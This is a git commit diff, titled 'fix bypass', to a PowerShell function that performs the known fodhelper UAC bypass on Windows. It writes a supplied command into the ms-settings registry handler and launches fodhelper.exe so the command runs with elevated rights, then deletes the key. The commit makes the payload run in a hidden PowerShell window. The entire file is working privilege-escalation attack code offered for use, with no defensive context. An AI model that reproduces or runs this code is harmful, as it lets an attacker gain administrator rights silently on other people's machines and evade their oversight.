8523958a193ebeb16248bbda9b3bdd0d6f5777b5
k-lfa <37381068+k-lfa@users.noreply.github.com>
2025-03-21 17:40:10 +0100

    fix bypass

--- Custom/FodhelperBypassUAC.ps1
+++ Custom/FodhelperBypassUAC.ps1
@@ -1,22 +1,16 @@
 function FodhelperBypass {
-    [CmdletBinding()]
     Param (
         [Parameter(Mandatory = $true)]
         [string]$Command
     )
 
-    $payload = 'cmd.exe /c start "" ' + $Command
-
+    $payload = 'cmd.exe /c start powershell.exe -NoP -W Hidden -C "' + $Command + '"'
 
     New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
     New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
     Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $payload -Force
 
     Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-
-    # Petite pause pour laisser le temps au process élevé de démarrer
     Start-Sleep -Seconds 3
-
-    # Nettoie la clé de registre
     Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
 }
